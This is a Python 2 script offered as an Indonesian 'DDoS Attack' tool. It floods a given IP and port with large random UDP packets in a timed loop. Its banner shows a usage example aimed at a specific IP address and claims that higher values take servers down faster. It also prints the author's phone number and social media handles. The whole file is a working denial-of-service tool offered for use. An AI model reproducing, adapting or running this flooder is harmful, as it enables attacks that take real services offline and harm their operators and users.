import time
import socket
import random
import sys
def usage():

    print "\033[1;35m _______         ______"
    print "\033[1;35m __  __ \____  _____  / _____  _________ ____  __"
    print "\033[1;35m _  / / /__  |/_/__  /  __  / / /__  __ \__  |/_/"
    print "\033[1;36m / /_/ / __>  <  _  /____  /_/ / _  / / /__>  <"
    print "\033[1;36m \____/  /_/|_|  /_____/_\__, /  /_/ /_/ /_/|_|"
    print "\033[1;36m                        /____/\033[1;35m   DDoS Attack "
    print "\033[1;32m"
    print "\033[1;32m"
    print "\033[1;37m              ================\033[1;31m================"
    print "\033[1;31m              | [+] INDONESIA \033[1;37mDDOSATTACK [+] |"
    print "\033[1;31m==========================================================="
    print "\033[1;33m| Command   : \033[1;32m python2 ddosattack.py <IP> <PORT> <PACKET> |"
    print "\033[1;37m==========================================================="
    print "\033[1;33m| Creator   : \033[1;32m OxLynx	    		      		  |"
    print "\033[1;31m==========================================================="
    print "\033[1;33m| Whatsapp  : \033[1;32m 085850252221  		       	 	  |"
    print "\033[1;37m==========================================================="
    print "\033[1;33m| Facebook  : \033[1;32m Bagus P	  		       		  |"
    print "\033[1;31m==========================================================="
    print "\033[1;33m| Instagram : \033[1;32m @bagusp073 		       		  |"
    print "\033[1;37m==========================================================="
    print "\033[5;36m[!] NB : PORT DEFAULT 80 & PACKET DEFAULT 135 [!]"
    print "\033[5;37m[ Contoh : \033[5;32mpython2 ddosattack.py\033[5;31m 104.27.176.146 \033[5;34m80 \033[5;33m135 ]"
    print "\033[5;35m[+] LEBIH TINGGI PACKET MEMUNGKINKAN SERVER CEPAT DOWN [+]"
    print "\033[5;32m"
def flood(victim, vport, duration):
    # Subscribe Youtube : OxLynx
    # Like Subscribe
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Berfikir Global Bersikap Lokal
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mGaskeun Cuk \033[1;37m%s \033[1;91mIP Target \033[1;37m%s \033[1;91mPORT \033[1;37m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()

